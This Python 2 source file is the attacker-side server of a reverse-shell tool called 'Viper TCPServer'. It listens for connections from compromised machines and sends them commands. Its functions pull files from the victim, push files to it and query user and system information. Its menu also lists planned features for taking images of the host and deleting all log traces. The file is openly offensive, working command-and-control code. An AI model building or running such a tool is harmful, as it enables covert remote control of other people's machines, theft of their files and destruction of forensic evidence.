#!/usr/bin/python
from twisted.internet.protocol import Factory
from twisted.internet import protocol, reactor
from twisted.python import log

import socket
import os
import time


"""This is python reverse shell that grabs files or information and reports back to the server!"""


def banner():
    print """
    Name : Viper TCPServer by Black Signals
    Date : 03 March 17
    Version : v1.0
#   __   _____ ___ ___ ___   
#   \ \ / /_ _| _ \ __| _ \  #
#    \ V / | ||  _/ _||   /  #
#     \_/ |___|_| |___|_|_\  #
#                            
                    Going low and slow
"""

def menu():
    """This is the program menu"""
    print "[*] Command options: "
    print
    print "[*] grab*<filename> ========= > grabs the file and saves it to the local desktop as .txt" #DONE
    print "[*] getenv       ========= >  prints the system information" #Works
    print "[*] getuid       ========= > Get the user level access of the shell" #works
    print "[*] SystemInfo   ========= > Get Fingerprint of the system" #TODO
    print "[*] capture      ========= > take images of the host machine " #Working on this
    print "[*] Cover        ========= > Delete all traces of logs" #TODO
    print "\n"

def transfer(conn,command):
    conn.send(command)
    f = open('/root/Desktop/test.py','wb')
    while True:
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Transfer completed '
            f.close()
            break
        f.write(bits)
    f.close()

def send(s, path, command):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        print('[+] File Sent!')
        f.close()
    else:
        print('File does not exist')



def connect():
    try:
        while True:
            ip = (raw_input("Enter the LHOST IP: "))
            port = int(raw_input("Enter the LHOST port: "))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.bind((ip, port))
                print "[+] ip", ip, "is open"
                print "[+] port", port, "is open"
            except socket.error:
                time.sleep( 3.0)
                print "[+] ip", ip, "is closed"
                print "[+] port", port, "is closed"
                print 'Socket connect failed! Loop up and try socket again'
                connect()
    
            s.listen(1)
            print '[+] listening for incoming TCP connection on ip address %s and port number %d' % ('ip', port)
            conn, addr = s.accept()
            print '[+] We got a connection from: ',addr
            print '[+] for now to change directorys to folders with spaces use shortname (eg. cd c:\PROGRA~1)'
            break

        while True:
            command = raw_input("$ ViperShell>> ")

            if 'terminate' in command:
                conn.send('terminate')
                conn.close() #close the connection with host
                break
            elif 'grab' in command:
                transfer(conn,command)  #usage shell > grab*file

            elif 'send' in command:
                conn.send(command)
                sendW,path = command.split('*')
                try:
                    send(conn, path, command)
                except Exception,e:
                    s.send (str(e))
                    pass
            else:
                conn.send(command) #send command
                print conn.recv(1024)

    except KeyboardInterrupt:
        print 'interrupted!'
        print 'returning to main program'
        os.system('python ../../viper.py')      

def main():
    banner()
    menu()
    connect()

if __name__ == "__main__":
    main()
